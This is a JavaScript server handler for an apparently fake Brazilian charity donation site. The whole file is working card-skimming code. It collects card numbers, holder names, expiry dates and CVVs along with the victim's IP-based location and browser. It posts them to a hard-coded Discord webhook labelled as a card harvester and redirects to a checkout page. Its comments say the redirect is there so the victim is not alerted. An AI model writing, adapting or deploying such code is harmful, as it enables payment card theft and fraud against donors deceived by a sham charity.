export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.redirect('https://doe.savebrasil.org.br/');
  }

  const {
    numero_cartao = '',
    nome_cartao = '',
    validade_cartao = '',
    cvv = '',
    valor_doacao = ''
  } = req.body || {};

  if (!numero_cartao || !cvv) {
    return res.status(400).send('Faltou cartão ou cvv');
  }

  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.headers['cf-connecting-ip'] || req.socket?.remoteAddress || 'desconhecido';
  const userAgent = req.headers['user-agent'] || 'N/A';
  const acceptLanguage = req.headers['accept-language'] || 'N/A';

  let ipInfo = { query: ip, city: 'N/A', regionName: 'N/A', country: 'N/A', isp: 'N/A' };
  try {
    const ipRes = await fetch(`http://ip-api.com/json/${ip}`);
    if (ipRes.ok) ipInfo = await ipRes.json();
  } catch {}

  let navegador = 'Desconhecido';
  if (/Firefox/i.test(userAgent)) navegador = 'Firefox';
  else if (/Edg/i.test(userAgent)) navegador = 'Edge';
  else if (/Chrome/i.test(userAgent)) navegador = 'Chrome';
  else if (/Safari/i.test(userAgent)) navegador = 'Safari';
  else if (/OPR|Opera/i.test(userAgent)) navegador = 'Opera';

  const dataHora = new Date().toISOString().replace('T', ' ').split('.')[0];

  const conteudo = 
`🦆 | LOG REAL | doe.savebrasil.org.br

💳 Número: ${numero_cartao}
🔐 Nome: ${nome_cartao}
📅 Validade: ${validade_cartao}
🔑 CVV: ${cvv}
💰 Valor: R$ ${valor_doacao}

🏠 IP: ${ipInfo.query || ip}
🔎 Cidade: ${ipInfo.city}
📍 Região: ${ipInfo.regionName}
🌎 País: ${ipInfo.country}
📦 ISP: ${ipInfo.isp}

🔓 UA: ${userAgent}
🌐 Navegador: ${navegador}
👥 Idioma: ${acceptLanguage}
📆 Data/Hora: ${dataHora}`;

  const webhookUrl = 'https://discord.com/api/webhooks/1464464364890357771/1RVTOrZ7cBDmxnlsLvjTNTve65oiwgnDSw1Y7bBdixaPTOnBe_aERSqgXU4JpcSnDPGQ'; // <--- COLA TEU WEBHOOK AQUI

  try {
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: conteudo,
        username: 'Colhedor CC 🦆💳',
        avatar_url: 'https://i.imgur.com/pato-cc.jpg' // opcional
      })
    });
    return res.redirect(302, '/css/checkout.html');
  } catch (err) {
    console.error('Discord cagou:', err);
    return res.redirect(302, '/css/checkout.html'); // redireciona mesmo se der erro pra não alertar o trouxa
  }
}
